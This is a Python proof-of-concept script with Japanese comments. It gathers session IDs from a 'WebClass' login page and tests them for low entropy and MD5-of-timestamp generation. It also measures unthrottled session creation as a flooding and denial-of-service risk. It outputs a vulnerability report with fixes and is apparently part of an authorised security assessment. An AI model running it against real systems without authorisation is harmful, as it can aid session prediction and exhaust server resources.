#!/usr/bin/env python3
"""
EXP-002 PoC: WebClass セッションID予測可能性分析

使い方:
  # テスト環境のURLを指定して実行
  python3 exp002_session_predict.py --target https://<TEST_ENV>/webclass/login.php --count 200

  # 結果の保存
  python3 exp002_session_predict.py --target <URL> --count 200 --output results.json

注意: 必ず許可されたテスト環境に対してのみ実行すること。
"""

import argparse
import hashlib
import json
import math
import sys
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

import requests

requests.packages.urllib3.disable_warnings()


def collect_sessions(target_url: str, count: int, concurrency: int = 10) -> list[dict]:
    """セッションIDを収集"""
    results = []

    def fetch_one(idx: int) -> dict:
        t_start = time.time()
        try:
            resp = requests.get(target_url, verify=False, timeout=10, allow_redirects=False)
            t_end = time.time()
            cookies = resp.headers.get("Set-Cookie", "")
            session_id = None
            for part in cookies.split(","):
                part = part.strip()
                if part.startswith("WBT_Session="):
                    session_id = part.split("=", 1)[1].split(";")[0]
                    break
            return {
                "index": idx,
                "session_id": session_id,
                "timestamp": t_start,
                "elapsed_ms": round((t_end - t_start) * 1000, 2),
                "status_code": resp.status_code,
            }
        except Exception as e:
            return {"index": idx, "error": str(e), "timestamp": t_start}

    print(f"[*] {count}個のセッションIDを収集中 (並列数: {concurrency}) ...")
    with ThreadPoolExecutor(max_workers=concurrency) as pool:
        futures = {pool.submit(fetch_one, i): i for i in range(count)}
        for f in as_completed(futures):
            r = f.result()
            results.append(r)
            if len(results) % 50 == 0:
                print(f"  [{len(results)}/{count}]")

    results.sort(key=lambda x: x.get("timestamp", 0))
    return results


def analyze_entropy(sessions: list[dict]) -> dict:
    """セッションIDのエントロピー分析"""
    ids = [s["session_id"] for s in sessions if s.get("session_id")]

    if not ids:
        return {"error": "セッションID取得失敗"}

    # 一意性チェック
    unique = len(set(ids))
    duplicates = len(ids) - unique

    # 文字分布分析
    all_chars = "".join(ids)
    char_freq = Counter(all_chars)
    total_chars = len(all_chars)
    char_entropy = -sum(
        (c / total_chars) * math.log2(c / total_chars)
        for c in char_freq.values()
        if c > 0
    )

    # バイト位置ごとのエントロピー
    id_len = len(ids[0]) if ids else 0
    position_entropy = []
    for pos in range(id_len):
        chars_at_pos = [sid[pos] for sid in ids]
        freq = Counter(chars_at_pos)
        n = len(chars_at_pos)
        ent = -sum((c / n) * math.log2(c / n) for c in freq.values() if c > 0)
        position_entropy.append(round(ent, 4))

    # 連続セッション間の差分分析
    int_ids = [int(sid, 16) for sid in ids]
    diffs = [int_ids[i + 1] - int_ids[i] for i in range(len(int_ids) - 1)]
    diff_stats = {
        "min": min(diffs) if diffs else 0,
        "max": max(diffs) if diffs else 0,
        "mean": sum(diffs) / len(diffs) if diffs else 0,
        "unique_diffs": len(set(diffs)),
    }

    # MD5候補シード推測: timestamp ベースか
    timestamps = [s["timestamp"] for s in sessions if s.get("session_id")]
    md5_timestamp_matches = 0
    for i, sid in enumerate(ids[:50]):  # 最初の50個で検証
        ts = timestamps[i]
        for offset_ms in range(-100, 100):
            candidate = str(ts + offset_ms / 1000)
            if hashlib.md5(candidate.encode()).hexdigest() == sid:
                md5_timestamp_matches += 1
                break
            candidate2 = str(int(ts * 1000) + offset_ms)
            if hashlib.md5(candidate2.encode()).hexdigest() == sid:
                md5_timestamp_matches += 1
                break

    return {
        "total_collected": len(ids),
        "unique_ids": unique,
        "duplicates": duplicates,
        "id_length": id_len,
        "id_charset": "hex (0-9a-f)",
        "theoretical_bits": id_len * 4,  # hex = 4 bits per char
        "char_entropy_bits": round(char_entropy, 4),
        "max_possible_char_entropy": round(math.log2(16), 4),  # 4.0 for hex
        "position_entropy": position_entropy,
        "avg_position_entropy": round(sum(position_entropy) / len(position_entropy), 4) if position_entropy else 0,
        "sequential_diff_stats": diff_stats,
        "md5_timestamp_matches": md5_timestamp_matches,
        "predictable": md5_timestamp_matches > 0 or duplicates > 0 or (
            sum(position_entropy) / len(position_entropy) < 3.5 if position_entropy else False
        ),
    }


def analyze_session_flooding(sessions: list[dict]) -> dict:
    """セッションフラッディング分析"""
    valid = [s for s in sessions if s.get("session_id")]
    elapsed_times = [s["elapsed_ms"] for s in valid]
    timestamps = [s["timestamp"] for s in valid]
    duration = max(timestamps) - min(timestamps) if len(timestamps) > 1 else 0
    rate = len(valid) / duration if duration > 0 else 0

    return {
        "sessions_generated": len(valid),
        "duration_seconds": round(duration, 2),
        "rate_per_second": round(rate, 2),
        "avg_response_ms": round(sum(elapsed_times) / len(elapsed_times), 2) if elapsed_times else 0,
        "all_unique_sessions": len(valid) == len(set(s["session_id"] for s in valid)),
        "risk": "HIGH - サーバーはリクエスト毎に新規セッションを生成。"
                "レート制限なしで大量のセッション生成が可能。"
                "サーバーサイドのセッションストア枯渇によるDoSリスク。",
    }


def generate_report(target: str, sessions: list[dict], entropy: dict, flooding: dict) -> dict:
    """最終レポート生成"""
    return {
        "vulnerability_id": "EXP-002",
        "title": "WebClass セッションID予測可能性 + Session Flooding",
        "target": target,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "severity": "High",
        "cwe": ["CWE-330 (Use of Insufficiently Random Values)", "CWE-400 (Uncontrolled Resource Consumption)"],
        "evidence": {
            "sample_session_ids": [s["session_id"] for s in sessions[:10] if s.get("session_id")],
            "entropy_analysis": entropy,
            "flooding_analysis": flooding,
        },
        "conclusion": {
            "predictable": entropy.get("predictable", False),
            "session_flooding_possible": True,
            "httponly": False,
            "secure_flag": False,
            "samesite": "not set",
        },
        "recommendation": [
            "セッションIDの生成に暗号論的安全な乱数生成器(CSPRNG)を使用",
            "既存セッションがある場合は新規生成せずに再利用",
            "セッションCookieにSecure, HttpOnly, SameSite=Strict属性を付与",
            "IPベースのレート制限によるセッションフラッディング対策",
        ],
    }


def main():
    parser = argparse.ArgumentParser(description="EXP-002: WebClass Session Predictability PoC")
    parser.add_argument("--target", required=True, help="テスト環境のログインページURL")
    parser.add_argument("--count", type=int, default=200, help="収集するセッション数")
    parser.add_argument("--concurrency", type=int, default=10, help="並列リクエスト数")
    parser.add_argument("--output", default=None, help="結果JSONの出力先")
    args = parser.parse_args()

    if "webclass" not in args.target.lower():
        print("[!] 警告: URLにwebclassが含まれていません。対象を確認してください。")

    # 収集
    sessions = collect_sessions(args.target, args.count, args.concurrency)

    # 分析
    entropy = analyze_entropy(sessions)
    flooding = analyze_session_flooding(sessions)

    # レポート
    report = generate_report(args.target, sessions, entropy, flooding)

    # 出力
    output_path = args.output or f"outputs/poc/exp002_result_{int(time.time())}.json"
    with open(output_path, "w") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)

    print(f"\n{'='*60}")
    print(f"EXP-002 結果サマリー")
    print(f"{'='*60}")
    print(f"収集セッション数: {entropy['total_collected']}")
    print(f"一意ID数:         {entropy['unique_ids']}")
    print(f"重複:             {entropy['duplicates']}")
    print(f"ID長:             {entropy['id_length']}文字 ({entropy['theoretical_bits']}bit)")
    print(f"文字エントロピー: {entropy['char_entropy_bits']:.4f} / {entropy['max_possible_char_entropy']:.4f} bit")
    print(f"平均位置エントロピー: {entropy['avg_position_entropy']:.4f} bit")
    print(f"MD5(timestamp)一致: {entropy['md5_timestamp_matches']}件")
    print(f"予測可能:         {'YES' if entropy['predictable'] else 'NO'}")
    print(f"フラッディング率: {flooding['rate_per_second']:.1f} sessions/sec")
    print(f"{'='*60}")
    print(f"結果保存先: {output_path}")

    return 0 if not entropy.get("predictable") else 1


if __name__ == "__main__":
    sys.exit(main())
